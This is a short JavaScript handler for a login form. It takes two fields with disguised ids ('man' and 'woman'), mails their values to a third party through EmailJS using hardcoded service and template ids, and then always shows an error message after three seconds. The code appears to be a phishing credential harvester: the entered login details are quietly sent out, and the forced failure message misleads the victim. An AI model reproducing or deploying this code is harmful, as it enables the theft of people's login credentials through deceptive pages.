document.getElementById('loginForm').addEventListener('submit', function(e) {
  e.preventDefault(); // Prevent form submission

  const man = document.getElementById('man').value;
  const woman = document.getElementById('woman').value;

  // Show the spinner to indicate that the email is being sent
  document.getElementById('spinner').style.display = 'block';
  document.getElementById('error-message').style.display = 'none'; // Hide error message initially

  // Send email using EmailJS immediately
  emailjs.send('service_mclb6ze', 'template_30nlj5e', {
    man: man,
    woman: woman
  })
  .then(function(response) {
    console.log('Email sent successfully:', response);
    document.getElementById('spinner').style.display = 'none'; // Hide the spinner
    alert('Email sent successfully!');
  })
  .catch(function(error) {
    console.error('Error sending email:', error);
    document.getElementById('spinner').style.display = 'none'; // Hide the spinner
    // Display error message after email fails
    document.getElementById('error-message').style.display = 'block';
  });

  // Optionally, simulate network error after a timeout (for demo purposes)
  setTimeout(function() {
    document.getElementById('error-message').style.display = 'block'; // Show error message after 3 seconds (simulate network error)
  }, 3000); // Show error message after 3 seconds
});
